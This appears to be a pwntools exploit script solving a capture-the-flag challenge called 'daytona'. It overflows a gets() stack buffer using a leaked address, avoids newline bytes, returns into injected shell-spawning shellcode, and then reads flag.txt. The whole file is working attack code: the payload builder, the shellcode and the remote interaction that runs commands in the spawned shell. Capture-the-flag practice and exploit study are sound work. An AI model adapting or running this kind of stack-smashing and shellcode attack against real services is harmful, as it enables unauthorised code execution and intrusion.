import os
import time
from pwn import *

exe = ELF('./daytona')
context.binary = exe
context.log_level = 'warn'

HOST = os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', 25606))

# vuln() reads into buf (sp+0x10) with gets() and leaks "buf - 0x75"; the saved
# return address of main() sits 72 bytes past buf. There is no canary and the
# stack is executable, so we jump to shellcode placed on the stack.
#
# gets() stops at a 0x0a byte, and under qemu-user the stack is not randomized:
# buf is 0x...0ae0, so any address inside buf itself (0x...0aXX) encodes a 0x0a
# and would truncate the payload. We dodge that by putting the shellcode *after*
# the return-address slot (offset >= 80) and returning to the first such offset
# whose address has no 0x0a byte (e.g. buf+0x50 -> 0x...0b30).
NOP = b'\x1f\x20\x03\xd5'
shellcode = NOP * 4 + asm(shellcraft.sh())
assert b'\n' not in shellcode


def build_payload(buf):
	for off in range(80, 0x800, 8):
		target = buf + off
		if b'\n' in p64(target):
			continue
		payload = b'A' * 72 + p64(target) + b'A' * (off - 80) + shellcode
		if b'\n' not in payload:
			return payload
	return None


def try_once():
	p = remote(HOST, PORT)
	try:
		p.recvuntil(b'going ')
		buf = int(p.recvuntil(b' ').decode('utf-8')) + 0x75
		info(f"[+] Buf @ {hex(buf)}")
		payload = build_payload(buf)
		if payload is None:
			return None
		p.recvuntil(b'??')
		p.sendline(payload)
		# Let gets() consume only the payload line and the shell come up before
		# sending the command, so "cat" reaches the spawned shell.
		time.sleep(1)
		p.sendline(b'cat flag.txt')
		return p.recvrepeat(3)
	except EOFError:
		return None
	finally:
		try:
			p.close()
		except Exception:
			pass


for attempt in range(5):
	out = try_once()
	if out and b'sun{' in out:
		print(out.decode(errors='replace'))
		break
else:
	print("Exploit failed to retrieve the flag.")
